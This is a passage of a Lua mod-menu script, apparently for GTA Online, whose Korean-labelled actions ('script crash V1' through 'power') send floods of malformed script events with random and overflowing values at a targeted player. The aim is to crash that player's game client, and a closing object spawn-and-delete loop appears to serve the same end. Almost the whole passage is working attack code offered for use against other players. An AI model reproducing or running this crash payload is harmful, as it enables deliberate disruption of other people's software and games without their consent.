        local a2 = entities.create_object(3613262246, cord)
        local b1 = entities.create_object(452618762, cord)
        local b2 = entities.create_object(3613262246, cord)
        for i = 1, 10 do
            util.request_model(-930879665)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(452618762)
            util.yield(300)
            entities.delete_by_handle(a1)
            entities.delete_by_handle(a2)
            entities.delete_by_handle(b1)
            entities.delete_by_handle(b2)
            util.request_model(452618762)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(-930879665)
            util.yield(10)
        end
        util.toast("Terminado.")
    end)

    local scrcrash = menu.list(twotake, "스크립트 크래쉬", {}, "")

    menu.action(scrcrash, "스크립트 크래쉬 V1", {"crashv6"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {2765370640, player_id, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {1348481963, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-1733737974, player_id, 789522, 59486,48512151,-9545440,5845131,848153,math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-1529596656, player_id, 795221, 59486,48512151,-9545440 , math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        end
        util.yield(100)
        util.trigger_script_event(1 << player_id, {-555356783, 18, -72614, 63007, 59027, -12012, -26996, 33398, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        util.trigger_script_event(1 << player_id, {962740265, 2000000, 2000000, 2000000, 2000000})
        util.trigger_script_event(1 << player_id, {1228916411, 1, 1245317585})
        util.trigger_script_event(1 << player_id, {962740265, 1, 0, 144997919, -1907798317, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
        util.trigger_script_event(1 << player_id, {-1386010354, 1, 0, 92623021, -1907798317, 0, 0, 0, 0, 1})
        util.trigger_script_event(1 << player_id, {-555356783, player_id, 85952,99999,52682274855,526822745})
        util.trigger_script_event(1 << player_id, {526822748, player_id, 78552,99999 ,7949161,789454312})
        util.trigger_script_event(1 << player_id, {-8965204809, player_id, 795221,59486,48512151,-9545440})
        util.trigger_script_event(1 << player_id, {495813132, player_id, 0, 0, -12988, -99097, 0})
        util.trigger_script_event(1 << player_id, {495813132, player_id, -4640169, 0, 0, 0, -36565476, -53105203})
        util.trigger_script_event(1 << player_id, {495813132, player_id,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    
    end)

    menu.action(scrcrash, "스크립트 크래쉬 V2", {"crashv7"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {2765370640, player_id, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {1348481963, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        end
        util.yield(100)
        util.trigger_script_event(1 << player_id, {495813132, player_id, 0, 0, -12988, -99097, 0})
        util.trigger_script_event(1 << player_id, {495813132, player_id, -4640169, 0, 0, 0, -36565476, -53105203})
        util.trigger_script_event(1 << player_id, {495813132, player_id,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        util.trigger_script_event(1 << player_id, {-555356783, 18, -72614, 63007, 59027, -12012, -26996, 33398, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        util.trigger_script_event(1 << player_id, {962740265, 2000000, 2000000, 2000000, 2000000})
        util.trigger_script_event(1 << player_id, {1228916411, 1, 1245317585})
        util.trigger_script_event(1 << player_id, {962740265, 1, 0, 144997919, -1907798317, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
        util.trigger_script_event(1 << player_id, {-1386010354, 1, 0, 92623021, -1907798317, 0, 0, 0, 0, 1})
        util.trigger_script_event(1 << player_id, {-555356783, player_id, 85952,99999,52682274855,526822745})
        util.trigger_script_event(1 << player_id, {526822748, player_id, 78552,99999 ,7949161,789454312})
        util.trigger_script_event(1 << player_id, {-8965204809, player_id, 795221,59486,48512151,-9545440})
        util.trigger_script_event(1 << player_id, {495813132, player_id, 0, 0, -12988, -99097, 0})
        util.trigger_script_event(1 << player_id, {495813132, player_id, -4640169, 0, 0, 0, -36565476, -53105203})
        util.trigger_script_event(1 << player_id, {495813132, player_id,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(scrcrash, "스크립트 크래쉬 V3", {"crashv8"}, "그것은 잘 작동하지 않는다", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-555356783,1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            end
            util.yield(200)
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
                util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
                util.trigger_script_event(1 << player_id, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
            util.trigger_script_event(1 << player_id, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(scrcrash, "스크립트 크래쉬 V5", {"crashv11"}, "그것은 잘 작동하지 않는다", function()
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
            end
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
    end)

    menu.action(scrcrash, "스크립트 크래쉬 파워", {"crashv9"}, "효과가 있긴 한데.. 매우 강력합니다. (오버로드 가능)", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << player_id, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
            util.trigger_script_event(1 << player_id, {1348481963, 22, -2147483647})
            util.trigger_script_event(1 << player_id, {495813132, 22, 0, 0, -12988, -99097, 0})
            util.trigger_script_event(1 << player_id, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
            util.trigger_script_event(1 << player_id, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
            util.trigger_script_event(1 << player_id, {526822748, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {-555356783, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {-637352381, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {-51486976, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {-1386010354, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {1480548969, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << player_id, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << player_id, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << player_id, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
            util.trigger_script_event(1 << player_id, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
            util.trigger_script_event(1 << player_id, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
            util.trigger_script_event(1 << player_id, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
            util.trigger_script_event(1 << player_id, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
            util.trigger_script_event(1 << player_id, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
            util.trigger_script_event(1 << player_id, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
            util.trigger_script_event(1 << player_id, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
            util.trigger_script_event(1 << player_id, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
            util.trigger_script_event(1 << player_id, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
            util.trigger_script_event(1 << player_id, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
            util.trigger_script_event(1 << player_id, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
            util.trigger_script_event(1 << player_id, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
            util.trigger_script_event(1 << player_id, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
            util.trigger_script_event(1 << player_id, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
            util.trigger_script_event(1 << player_id, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
            util.trigger_script_event(1 << player_id, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
            util.trigger_script_event(1 << player_id, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
            util.trigger_script_event(1 << player_id, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
            end
            util.yield(200)
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
                util.trigger_script_event(1 << player_id, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
                util.trigger_script_event(1 << player_id, {1348481963, 22, -2147483647})
                util.trigger_script_event(1 << player_id, {495813132, 22, 0, 0, -12988, -99097, 0})
                util.trigger_script_event(1 << player_id, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
                util.trigger_script_event(1 << player_id, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
                util.trigger_script_event(1 << player_id, {526822748, -1, 500000, 849451549, -1, -1})
                util.trigger_script_event(1 << player_id, {-555356783, -1, 500000, 849451549, -1, -1})
                util.trigger_script_event(1 << player_id, {-637352381, -1, 500000, 849451549, -1, -1})
                util.trigger_script_event(1 << player_id, {-51486976, -1, 500000, 849451549, -1, -1})
                util.trigger_script_event(1 << player_id, {-1386010354, -1, 500000, 849451549, -1, -1})
                util.trigger_script_event(1 << player_id, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                util.trigger_script_event(1 << player_id, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                util.trigger_script_event(1 << player_id, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                util.trigger_script_event(1 << player_id, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                util.trigger_script_event(1 << player_id, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                util.trigger_script_event(1 << player_id, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                util.trigger_script_event(1 << player_id, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                util.trigger_script_event(1 << player_id, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                util.trigger_script_event(1 << player_id, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                util.trigger_script_event(1 << player_id, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                util.trigger_script_event(1 << player_id, {1480548969, -1, 500000, 849451549, -1, -1})
                util.trigger_script_event(1 << player_id, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
                util.trigger_script_event(1 << player_id, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
                util.trigger_script_event(1 << player_id, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
                util.trigger_script_event(1 << player_id, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
                util.trigger_script_event(1 << player_id, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
                util.trigger_script_event(1 << player_id, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
                util.trigger_script_event(1 << player_id, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
                util.trigger_script_event(1 << player_id, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
                util.trigger_script_event(1 << player_id, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
                util.trigger_script_event(1 << player_id, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
                util.trigger_script_event(1 << player_id, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
                util.trigger_script_event(1 << player_id, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
                util.trigger_script_event(1 << player_id, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
                util.trigger_script_event(1 << player_id, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
                util.trigger_script_event(1 << player_id, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
                util.trigger_script_event(1 << player_id, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
                util.trigger_script_event(1 << player_id, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
                util.trigger_script_event(1 << player_id, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
                util.trigger_script_event(1 << player_id, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
                util.trigger_script_event(1 << player_id, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
                util.trigger_script_event(1 << player_id, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
                util.trigger_script_event(1 << player_id, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
                util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
                util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
            end
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
            util.trigger_script_event(1 << player_id, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
            util.trigger_script_event(1 << player_id, {1348481963, 22, -2147483647})
            util.trigger_script_event(1 << player_id, {495813132, 22, 0, 0, -12988, -99097, 0})
            util.trigger_script_event(1 << player_id, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
            util.trigger_script_event(1 << player_id, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
            util.trigger_script_event(1 << player_id, {526822748, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {-555356783, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {-637352381, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {-51486976, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {-1386010354, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {1480548969, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << player_id, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << player_id, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << player_id, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
            util.trigger_script_event(1 << player_id, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
            util.trigger_script_event(1 << player_id, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
            util.trigger_script_event(1 << player_id, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
            util.trigger_script_event(1 << player_id, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
            util.trigger_script_event(1 << player_id, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
